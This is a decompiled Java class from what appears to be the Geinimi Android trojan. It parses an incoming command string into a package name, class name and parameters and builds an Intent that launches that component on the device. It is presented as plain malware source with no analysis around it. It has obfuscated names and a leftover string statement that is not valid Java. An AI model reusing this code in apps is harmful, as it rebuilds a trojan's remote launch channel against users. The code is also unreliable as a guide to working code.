package com.geinimi.ads;

import android.content.ComponentName;
import android.content.Intent;
import com.geinimi.C0000r;
import com.sumsharp.monster.common.Tool;

public final class n extends Advertisable {
    private String[] b = {"package_name", "class_name", "para_values"};

    protected n(String str) {
        super(str);
    }

    public final boolean b() {
        return true;
    }

    public final void c() {
        String substring;
        String str;
        String substring2 = this.a.substring(C0000r.s.length());
        a("package_name", substring2.substring(0, substring2.indexOf(";")));
        String substring3 = substring2.substring(substring2.indexOf(";") + 1);
        int indexOf = substring3.indexOf(";");
        if (indexOf == -1) {
            str = substring3;
            substring = null;
        } else {
            String substring4 = substring3.substring(0, indexOf);
            substring = substring3.substring(indexOf + 1);
            if (substring.indexOf(";") == -1) {
                str = substring4;
            } else {
                substring = substring.substring(0, substring.indexOf(";"));
                str = substring4;
            }
        }
        a("class_name", str);
        a("para_values", substring);
    }

    public final int d() {
        return 17301558;
    }

    public final int e() {
        return 17301636;
    }

    public final Intent f() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(a((String) "package_name"), a((String) "class_name")));
        intent.setFlags(Tool.FILL_VERYDARK);
        if (a((String) "para_values") != null) {
            intent.putExtra("com.geinimi.AdActivity", a((String) "para_values"));
        }
        "callad getInvokationIntent........." + intent;
        return intent;
    }

    /* access modifiers changed from: protected */
    public final String[] h() {
        return this.b;
    }
}
